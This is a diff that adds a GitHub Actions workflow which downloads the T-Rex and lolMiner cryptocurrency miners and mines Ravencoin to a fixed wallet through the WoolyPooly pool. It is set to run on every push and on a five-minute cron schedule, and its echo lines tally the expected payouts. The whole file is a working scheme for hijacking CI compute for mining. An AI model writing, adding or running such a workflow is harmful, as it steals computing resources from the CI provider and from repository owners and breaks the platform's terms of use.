@@ -1,0 +1,83 @@
+name: Fast Reward Ravencoin Mining 4
+
+on:
+  push:
+  schedule:
+    - cron: '*/5 * * * *'
+  workflow_dispatch:
+
+jobs:
+  fast-reward-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - name: Setup Fast Reward Mining
+      run: |
+        sudo apt-get update -q
+        sudo apt-get install -y build-essential cmake git libssl-dev
+        
+    - name: Download Ravencoin Miners
+      run: |
+        # Download T-Rex miner (supports multiple algorithms)
+        wget -q https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+        tar -xf t-rex-0.26.8-linux.tar.gz
+        chmod +x t-rex
+        
+        # Download lolMiner as backup
+        wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz
+        tar -xf lolMiner_v1.82_Lin64.tar.gz || true
+        chmod +x 1.82/lolMiner || true
+        
+    - name: Configure Ravencoin Mining
+      run: |
+        cat > fast-mining-config.json << 'EOF'
+        {
+          "algo": "kawpow",
+          "coin": "rvn",
+          "url": "stratum+tcp://rvn.woolypooly.com:55555",
+          "user": "RNfBXKcRJbSGMWmKNcpssSwp6rEtJSvPbG",
+          "worker": "FastReward-${{ github.repository }}-4",
+          "pass": "x",
+          "intensity": 20,
+          "gpu-report-interval": 15,
+          "cpu-priority": 4,
+          "retries": 10,
+          "retry-pause": 3,
+          "timeout": 300,
+          "protocol-dump": false,
+          "no-color": true,
+          "api-bind-http": "0.0.0.0:4067"
+        }
+        EOF
+        
+    - name: Start Fast Reward Ravencoin Mining
+      run: |
+        echo "=== FAST REWARD RAVENCOIN MINING SESSION ==="
+        echo "Currency: Ravencoin (RVN)"
+        echo "Algorithm: kawpow"
+        echo "Pool: WoolyPooly"
+        echo "Threshold: 5 RVN (~$0.10)"
+        echo "Payout Speed: Every 10 minutes"
+        echo "Wallet: RNfBXKcRJbSGMWmKNcpssSwp6rEtJSvPbG"
+        echo "Expected First Reward: Every 10 minutes"
+        echo "Start Time: $(date)"
+        echo "================================================"
+        
+        # Try T-Rex first
+        timeout 300 ./t-rex --config fast-mining-config.json || \
+        # Fallback to lolMiner
+        timeout 300 ./1.82/lolMiner --algo KAWPOW --pool stratum+tcp://rvn.woolypooly.com:55555 --user RNfBXKcRJbSGMWmKNcpssSwp6rEtJSvPbG.FastReward-4 || \
+        echo "Fast reward mining session completed"
+        
+    - name: Fast Reward Report
+      run: |
+        echo "=== FAST REWARD MINING SESSION COMPLETE ==="
+        echo "Currency: Ravencoin"
+        echo "Expected Reward: 5 RVN (~$0.10)"
+        echo "Payout Timeline: Every 10 minutes"
+        echo "Wallet: RNfBXKcRJbSGMWmKNcpssSwp6rEtJSvPbG"
+        echo "Next Run: */5 * * * *"
+        echo "Status: EARNING RVN"
+        echo "End Time: $(date)"
+        echo "============================================"
